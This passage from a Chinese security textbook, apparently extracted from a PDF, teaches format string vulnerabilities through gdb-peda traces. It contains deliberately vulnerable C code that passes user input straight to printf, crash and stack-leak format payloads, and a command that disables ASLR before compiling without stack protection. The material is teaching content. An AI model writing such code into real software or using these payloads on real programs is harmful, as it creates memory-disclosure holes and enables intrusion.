0020| 0xffffd234 --> 0x0
0024| 0xffffd238 --> 0x0
0028| 0xffffd23c --> 0xf7df1253 (: add
320
3.1.1 格式化字符串漏洞
esp,0x10)
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
0x56555572 in main ()
gdb-peda$ r
Continuing
Hello World! 233
[Inferior 1 (process 27416) exited with code 022]
根据 cdecl 的调用约定，在进入 printf() 函数之前，将参数从右到左依次压
栈。进入 printf() 之后，函数首先获取第一个参数，一次读取一个字符。如果
字符不是 % ，字符直接复制到输出中。否则，读取下一个非空字符，获取相应的
参数并解析输出。（注意： % d 和 %d 是一样的）
接下来我们修改一下上面的程序，给格式字符串加上 %x %x %x %3$s ，使它出现
格式化字符串漏洞：
#include
void main() {
printf("%s %d %s %x %x %x %3$s", "Hello World!", 233, "\n");
}
反汇编后的代码同上，没有任何区别。我们主要看一下参数传递：
gdb-peda$ n
[----------------------------------registers--------------------
---------------]
EAX: 0x56557000 --> 0x1efc
EBX: 0x56557000 --> 0x1efc
ECX: 0xffffd250 --> 0x1
EDX: 0x5655561f ("%s %d %s %x %x %x %3$s")
ESI: 0xf7f95000 --> 0x1bbd90
EDI: 0x0
EBP: 0xffffd238 --> 0x0
ESP: 0xffffd220 --> 0x5655561f ("%s %d %s %x %x %x %3$s")
321
3.1.1 格式化字符串漏洞
EIP: 0x56555572 (: call 0x565553d0 )
EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
---------------]
0x56555569 : lea edx,[eax-0x19e1]
0x5655556f : push edx
0x56555570 : mov ebx,eax
=> 0x56555572 : call 0x565553d0 
0x56555577 : add esp,0x10
0x5655557a : nop
0x5655557b : lea esp,[ebp-0x8]
0x5655557e : pop ecx
Guessed arguments:
arg[0]: 0x5655561f ("%s %d %s %x %x %x %3$s")
arg[1]: 0x56555612 ("Hello World!")
arg[2]: 0xe9
arg[3]: 0x56555610 --> 0x6548000a ('\n')
[------------------------------------stack----------------------
---------------]
0000| 0xffffd220 --> 0x5655561f ("%s %d %s %x %x %x %3$s")
0004| 0xffffd224 --> 0x56555612 ("Hello World!")
0008| 0xffffd228 --> 0xe9
0012| 0xffffd22c --> 0x56555610 --> 0x6548000a ('\n')
0016| 0xffffd230 --> 0xffffd250 --> 0x1
0020| 0xffffd234 --> 0x0
0024| 0xffffd238 --> 0x0
0028| 0xffffd23c --> 0xf7df1253 (: add
esp,0x10)
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
0x56555572 in main ()
322
3.1.1 格式化字符串漏洞
gdb-peda$ c
Continuing.
Hello World! 233
ffffd250 0 0
[Inferior 1 (process 27480) exited with code 041]
这一次栈的结构和上一次相同，只是格式字符串有变化。程序打印出了七个值（包
括换行），而我们其实只给出了前三个值的内容，后面的三个 %x 打印出了
0xffffd230~0xffffd238 栈内的数据，这些都不是我们输入的。而最后一个参
数 %3$s 是对 0xffffd22c 中 \n 的重用。
上一个例子中，格式字符串中要求的参数个数大于我们提供的参数个数。在下面的
例子中，我们省去了格式字符串，同样存在漏洞：
#include
void main() {
char buf[50];
if (fgets(buf, sizeof buf, stdin) == NULL)
return;
printf(buf);
}
gdb-peda$ n
[----------------------------------registers--------------------
---------------]
EAX: 0xffffd1fa ("Hello %x %x %x !\n")
EBX: 0x56557000 --> 0x1ef8
ECX: 0xffffd1fa ("Hello %x %x %x !\n")
EDX: 0xf7f9685c --> 0x0
ESI: 0xf7f95000 --> 0x1bbd90
EDI: 0x0
EBP: 0xffffd238 --> 0x0
ESP: 0xffffd1e0 --> 0xffffd1fa ("Hello %x %x %x !\n")
EIP: 0x5655562a (: call 0x56555450 )
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
323
3.1.1 格式化字符串漏洞
---------------]
0x56555623 : sub esp,0xc
0x56555626 : lea eax,[ebp-0x3e]
0x56555629 : push eax
=> 0x5655562a : call 0x56555450 
0x5655562f : add esp,0x10
0x56555632 : jmp 0x56555635 
0x56555634 : nop
0x56555635 : mov eax,DWORD PTR [ebp-0xc]
Guessed arguments:
arg[0]: 0xffffd1fa ("Hello %x %x %x !\n")
[------------------------------------stack----------------------
---------------]
0000| 0xffffd1e0 --> 0xffffd1fa ("Hello %x %x %x !\n")
0004| 0xffffd1e4 --> 0x32 ('2')
0008| 0xffffd1e8 --> 0xf7f95580 --> 0xfbad2288
0012| 0xffffd1ec --> 0x565555f4 (: add ebx,0x1a0c)
0016| 0xffffd1f0 --> 0xffffffff
0020| 0xffffd1f4 --> 0xffffd47a ("/home/firmy/Desktop/RE4B/c.out
")
0024| 0xffffd1f8 --> 0x65485ea0
0028| 0xffffd1fc ("llo %x %x %x !\n")
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
0x5655562a in main ()
gdb-peda$ c
Continuing.
Hello 32 f7f95580 565555f4 !
[Inferior 1 (process 28253) exited normally]
如果大家都是好孩子，输入正常的字符，程序就不会有问题。由于没有格式字符
串，如果我们在 buf 中输入一些转换指示符，则 printf() 会把它当做格式字
符串并解析，漏洞发生。例如上面演示的我们输入了 Hello %x %x %x !\n （其
中 \n 是 fgets() 函数给我们自动加上的），这时，程序就会输出栈内的数
据。
324
3.1.1 格式化字符串漏洞
我们可以总结出，其实格式字符串漏洞发生的条件就是格式字符串要求的参数和实
际提供的参数不匹配。下面我们讨论两个问题：
为什么可以通过编译？
因为 printf() 函数的参数被定义为可变的。
为了发现不匹配的情况，编译器需要理解 printf() 是怎么工作的和格
式字符串是什么。然而，编译器并不知道这些。
有时格式字符串并不是固定的，它可能在程序执行中动态生成。
printf() 函数自己可以发现不匹配吗？
printf() 函数从栈中取出参数，如果它需要 3 个，那它就取出 3 个。
除非栈的边界被标记了，否则 printf() 是不会知道它取出的参数比提
供给它的参数多了。然而并没有这样的标记。
格式化字符串漏洞利用
通过提供格式字符串，我们就能够控制格式化函数的行为。漏洞的利用主要有下面
几种。
使程序崩溃
格式化字符串漏洞通常要在程序崩溃时才会被发现，所以利用格式化字符串漏洞最
简单的方式就是使进程崩溃。在 Linux 中，存取无效的指针会引起进程收到
SIGSEGV 信号，从而使程序非正常终止并产生核心转储（在 Linux 基础的章节中
详细介绍了核心转储）。我们知道核心转储中存储了程序崩溃时的许多重要信息，
这些信息正是攻击者所需要的。
利用类似下面的格式字符串即可触发漏洞：
printf("%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s")
对于每一个 %s ， printf() 都要从栈中获取一个数字，把该数字视为一个
地址，然后打印出地址指向的内存内容，直到出现一个 NULL 字符。
因为不可能获取的每一个数字都是地址，数字所对应的内存可能并不存在。
还有可能获得的数字确实是一个地址，但是该地址是被保护的。
查看栈内容
325
3.1.1 格式化字符串漏洞
使程序崩溃只是验证漏洞的第一步，攻击者还可以利用格式化输出函数来获得内存
的内容，为下一步漏洞利用做准备。我们已经知道了，格式化字符串函数会根据格
式字符串从栈上取值。由于在 x86 上栈由高地址向低地址增长，而 printf() 函
数的参数是以逆序被压入栈的，所以参数在内存中出现的顺序与在 printf() 调
用时出现的顺序是一致的。
下面的演示我们都使用下面的源码：
#include
void main() {
char format[128];
int arg1 = 1, arg2 = 0x88888888, arg3 = -1;
char arg4[10] = "ABCD";
scanf("%s", format);
printf(format, arg1, arg2, arg3, arg4);
printf("\n");
}
# echo 0 > /proc/sys/kernel/randomize_va_space
$ gcc -m32 -fno-stack-protector -no-pie fmt.c
我们先输入 b main 设置断点，使用 n 往下执行，在 call 0x56555460
 处输入 %08x.%08x.%08x.%08x.%08x ，然后使用 c
继续执行，即可输出结果。
gdb-peda$ n
[----------------------------------registers--------------------
---------------]
EAX: 0xffffd584 ("%08x.%08x.%08x.%08x.%08x")
EBX: 0x56557000 --> 0x1efc
ECX: 0x1
EDX: 0xf7f9883c --> 0x0
ESI: 0xf7f96e68 --> 0x1bad90
EDI: 0x0
EBP: 0xffffd618 --> 0x0
ESP: 0xffffd550 --> 0xffffd584 ("%08x.%08x.%08x.%08x.%08x")
EIP: 0x56555642 (: call 0x56555430 )
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT dire
326
3.1.1 格式化字符串漏洞
ction overflow)
[-------------------------------------code----------------------
---------------]
0x56555638 : push DWORD PTR [ebp-0xc]
0x5655563b : lea eax,[ebp-0x94]
0x56555641 : push eax
=> 0x56555642 : call 0x56555430 
0x56555647 : add esp,0x20
0x5655564a : sub esp,0xc
0x5655564d : push 0xa
0x5655564f : call 0x56555450 
Guessed arguments:
arg[0]: 0xffffd584 ("%08x.%08x.%08x.%08x.%08x")
arg[1]: 0x1
arg[2]: 0x88888888
arg[3]: 0xffffffff
arg[4]: 0xffffd57a ("ABCD")
[------------------------------------stack----------------------
---------------]
0000| 0xffffd550 --> 0xffffd584 ("%08x.%08x.%08x.%08x.%08x")
0004| 0xffffd554 --> 0x1
0008| 0xffffd558 --> 0x88888888
0012| 0xffffd55c --> 0xffffffff
0016| 0xffffd560 --> 0xffffd57a ("ABCD")
0020| 0xffffd564 --> 0xffffd584 ("%08x.%08x.%08x.%08x.%08x")
0024| 0xffffd568 (" RUV\327UUVT\332\377\367\001")
0028| 0xffffd56c --> 0x565555d7 (: add ebx,0x1a2
9)
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
0x56555642 in main ()
gdb-peda$ x/10x $esp
0xffffd550: 0xffffd584 0x00000001 0x88888888
0xffffffff
0xffffd560: 0xffffd57a 0xffffd584 0x56555220
0x565555d7
0xffffd570: 0xf7ffda54 0x00000001
gdb-peda$ c
Continuing.
327
3.1.1 格式化字符串漏洞
00000001.88888888.ffffffff.ffffd57a.ffffd584
格式化字符串 0xffffd584 的地址出现在内存中的位置恰好位于参数
arg1 、 arg2 、 arg3 、 arg4 之前。格式字符串
%08x.%08x.%08x.%08x.%08x 表示函数 printf() 从栈中取出 5 个参数并将它
们以 8 位十六进制数的形式显示出来。格式化输出函数使用一个内部变量来标志下
一个参数的位置。开始时，参数指针指向第一个参数（ arg1 ）。随着每一个参数
被相应的格式规范所耗用，参数指针的值也根据参数的长度不断递增。在显示完当
前执行函数的剩余自动变量之后， printf() 将显示当前执行函数的栈帧（包括
返回地址和参数等）。
当然也可以使用 %p.%p.%p.%p.%p 得到相似的结果。
gdb-peda$ n
[----------------------------------registers--------------------
---------------]
EAX: 0xffffd584 ("%p.%p.%p.%p.%p")
EBX: 0x56557000 --> 0x1efc
ECX: 0x1
EDX: 0xf7f9883c --> 0x0
ESI: 0xf7f96e68 --> 0x1bad90
EDI: 0x0
EBP: 0xffffd618 --> 0x0
ESP: 0xffffd550 --> 0xffffd584 ("%p.%p.%p.%p.%p")
EIP: 0x56555642 (: call 0x56555430 )
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
---------------]
0x56555638 : push DWORD PTR [ebp-0xc]
0x5655563b : lea eax,[ebp-0x94]
0x56555641 : push eax
=> 0x56555642 : call 0x56555430 
0x56555647 : add esp,0x20
0x5655564a : sub esp,0xc
0x5655564d : push 0xa
0x5655564f : call 0x56555450 
Guessed arguments:
arg[0]: 0xffffd584 ("%p.%p.%p.%p.%p")
328
3.1.1 格式化字符串漏洞
arg[1]: 0x1
arg[2]: 0x88888888
arg[3]: 0xffffffff